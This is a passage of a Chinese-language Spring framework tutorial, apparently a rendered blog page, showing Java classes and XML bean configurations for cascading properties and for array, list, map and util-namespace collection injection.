class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2222&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;远大前程班&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="③方式三：级联属性赋值"><a href="#③方式三：级联属性赋值" class="headerlink" title="③方式三：级联属性赋值"></a>③方式三：级联属性赋值</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 一定先引用某个bean为属性赋值，才可以使用级联方式更新属性 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz.clazzId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;3333&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz.clazzName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;最强王者班&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-7、实验七：为数组类型属性赋值"><a href="#2-2-7、实验七：为数组类型属性赋值" class="headerlink" title="2.2.7、实验七：为数组类型属性赋值"></a>2.2.7、实验七：为数组类型属性赋值</h3><h4 id="①修改Student类"><a href="#①修改Student类" class="headerlink" title="①修改Student类"></a>①修改Student类</h4><p>在Student类中添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String[] hobbies;</span><br><span class="line"><span class="keyword">public</span> String[] getHobbies() &#123;</span><br><span class="line">    <span class="keyword">return</span> hobbies;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHobbies</span><span class="params">(String[] hobbies)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.hobbies = hobbies;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="②配置bean-1"><a href="#②配置bean-1" class="headerlink" title="②配置bean"></a>②配置bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ref属性：引用IOC容器中某个bean的id，将所对应的bean为属性赋值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>抽烟<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>喝酒<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>烫头<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2-2-8、实验八：为集合类型属性赋值"><a href="#2-2-8、实验八：为集合类型属性赋值" class="headerlink" title="2.2.8、实验八：为集合类型属性赋值"></a>2.2.8、实验八：为集合类型属性赋值</h3><h4 id="①为List集合类型属性赋值"><a href="#①为List集合类型属性赋值" class="headerlink" title="①为List集合类型属性赋值"></a>①为List集合类型属性赋值</h4><p>在Clazz类中添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Student&gt; students;</span><br><span class="line"><span class="keyword">public</span> List&lt;Student&gt; <span class="title function_">getStudents</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> students;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setStudents</span><span class="params">(List&lt;Student&gt; students)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.students = students;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置bean：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazzTwo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Clazz&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4444&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Javaee0222&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;students&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentTwo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentThree&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>若为Set集合类型属性赋值，只需要将其中的list标签改为set标签即可</p></blockquote><h4 id="②为Map集合类型属性赋值"><a href="#②为Map集合类型属性赋值" class="headerlink" title="②为Map集合类型属性赋值"></a>②为Map集合类型属性赋值</h4><p>创建教师类Teacher：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer teacherId;</span><br><span class="line">    <span class="keyword">private</span> String teacherName;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getTeacherId</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teacherId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherId</span><span class="params">(Integer teacherId)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.teacherId = teacherId;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTeacherName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> teacherName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherName</span><span class="params">(String teacherName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.teacherName = teacherName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(Integer teacherId, String teacherName)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.teacherId = teacherId;</span><br><span class="line">        <span class="built_in">this</span>.teacherName = teacherName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Teacher&#123;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;teacherId=&quot;</span> + teacherId +</span><br><span class="line">            <span class="string">&quot;, teacherName=&#x27;&quot;</span> + teacherName + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Student类中添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, Teacher&gt; teacherMap;</span><br><span class="line"><span class="keyword">public</span> Map&lt;String, Teacher&gt; <span class="title function_">getTeacherMap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> teacherMap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTeacherMap</span><span class="params">(Map&lt;String, Teacher&gt; teacherMap)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.teacherMap = teacherMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置bean：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;teacherOne&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Teacher&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10010&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;大宝&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;teacherTwo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Teacher&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10086&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;二宝&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ref属性：引用IOC容器中某个bean的id，将所对应的bean为属性赋值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>抽烟<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>喝酒<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>烫头<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherMap&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>10010<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;teacherOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">value</span>&gt;</span>10086<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;teacherTwo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="③引用集合类型的bean"><a href="#③引用集合类型的bean" class="headerlink" title="③引用集合类型的bean"></a>③引用集合类型的bean</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--list集合类型的bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">util:list</span> <span class="attr">id</span>=<span class="string">&quot;students&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentTwo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;studentThree&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">util:list</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--map集合类型的bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">util:map</span> <span class="attr">id</span>=<span class="string">&quot;teacherMap&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>10010<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;teacherOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>10086<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ref</span> <span class="attr">bean</span>=<span class="string">&quot;teacherTwo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">ref</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">util:map</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;clazzTwo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Clazz&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4444&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazzName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Javaee0222&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;students&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;students&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;studentFour&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.atguigu.spring.bean.Student&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1004&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;赵六&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span> <span class="attr">value</span>=<span class="string">&quot;26&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;女&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ref属性：引用IOC容器中某个bean的id，将所对应的bean为属性赋值 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;clazz&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;clazzOne&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hobbies&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>抽烟<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>喝酒<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>烫头<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;teacherMap&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;teacherMap&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>使用util:list、util:map标签必须引入相应的命名空间，可以通过idea的提示功能选择</p></blockquote><h3 id="2-2-9、实验九：p命名空间"><a href="#2-2-9、实验九：p命名空间" class="headerlink" title="2.2.9、实验九：p命名空间"></a>2.2.9、实验九：p命名空间</h3><p>引入p命名空间后，可以通过以下方式为bean的各个属性赋值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 